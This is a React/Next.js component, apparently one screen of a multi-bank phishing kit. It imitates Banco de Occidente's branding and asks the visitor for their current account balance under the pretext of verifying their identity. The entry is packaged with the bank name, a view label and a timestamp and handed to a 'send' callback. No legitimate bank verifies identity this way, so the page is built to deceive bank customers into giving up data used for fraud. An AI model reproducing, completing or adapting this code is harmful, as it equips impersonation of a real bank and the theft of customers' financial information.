/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

export default function Saldo({ enviar }: any) {
  const [saldo, setSaldo] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!saldo) return;

    const payload = {
      view: 'saldo',
      saldo,
      bank: "Occidente",
      timestamp: new Date().toISOString(),
    };

    enviar?.(payload);
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value) {
      value = new Intl.NumberFormat("es-CO").format(parseInt(value));
      setSaldo(`$ ${value}`);
    } else {
      setSaldo("");
    }
  };

  const isFormValid = !!saldo;

  return (
    <div className="min-h-screen bg-white">
      <div className="max-w-[400px] mx-auto px-8 py-8">

        {/* Logo */}
        <img
          src="/bancos/occidente/logo-occi.svg"
          width={180}
          height={40}
          alt="Logo Banco"
          className="mx-auto mb-6 w-[180px] h-auto"
        />

        {/* Texto de bienvenida */}
        <p className="text-center mb-6 text-gray-600 font-bold text-lg">
          Confirma tu saldo
        </p>
        <p className="text-center mb-6 text-gray-500 text-sm">
          Por favor, ingresa tu saldo actual para verificar tu identidad.
        </p>

        {/* Form */}
        <form onSubmit={handleSubmit} className="flex flex-col gap-6" noValidate>

          <label className="font-semibold text-sm text-gray-600">
            Saldo actual
          </label>
          <div className="flex relative">
            <input
              type="text"
              placeholder="$ 0"
              value={saldo}
              onChange={handleInputChange}
              className="w-full p-3.5 border border-[#cad6f1] rounded-lg text-gray-600 focus:outline-none focus:border-[#2C7BFF]"
              style={{ fontSize: '18px', fontWeight: 'bold' }}
            />
          </div>

          {/* Botón */}
          <button
            type="submit"
            disabled={!isFormValid}
            className={`w-full text-white py-4 rounded-md font-semibold ${isFormValid ? 'bg-linear-to-r from-[#0055D4] to-[#3C8DFF]' : 'bg-gray-400'}`}
          >
            Continuar
          </button>
        </form>
      </div>
    </div>
  );
}
